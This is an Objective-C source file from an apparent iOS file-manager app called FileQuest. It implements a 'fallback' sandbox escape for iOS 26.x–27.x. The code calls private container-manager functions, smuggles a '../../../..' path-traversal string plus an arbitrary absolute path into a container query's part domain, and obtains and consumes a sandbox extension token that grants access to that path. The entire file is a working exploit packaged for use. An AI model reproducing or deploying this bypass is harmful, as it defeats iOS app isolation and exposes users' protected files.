//
//  fallback_query.m
//  FileQuest
//
//  Fallback container-query access path for iOS 26.x and 27.x. The technique
//  follows the part-domain traversal approach used by Veilpath
//  (https://github.com/everettjf/veilpath) and bad_query
//  (https://github.com/forcequitOS/bad_query).
//
//  This program is free software: you can redistribute it and/or modify it
//  under the terms of the GNU General Public License as published by the Free
//  Software Foundation, either version 3 of the License, or (at your option)
//  any later version.
//

#import "fallback_query.h"

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);

int64_t fallback_query(NSString *target, bool alt_flags) {
    if (target.length == 0 || ![target hasPrefix: @"/"]) return -255;

    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    if (!identifier) {
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    query_set_class(query, 13);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    // The anchor container's Library/Caches is several levels below the data
    // volume root. Climb out of it, then append the absolute target path.
    const char *prefix = "../../../../../../../..";
    char *part = NULL;
    if (asprintf(&part, "%s%s", prefix, target.fileSystemRepresentation) == -1) {
        // ARC forbids xpc_release; the query owns/copies the identifier.
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    query_set_part_domain(query, part);
    query_set_flags(query, alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        // ARC forbids xpc_release; the query owns/copies the identifier.
        query_free(query);
        dlclose(mgr);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        // ARC forbids xpc_release; the query owns/copies the identifier.
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    // ARC forbids xpc_release; the query owns/copies the identifier.
    query_free(query);
    dlclose(mgr);
    return handle;
}
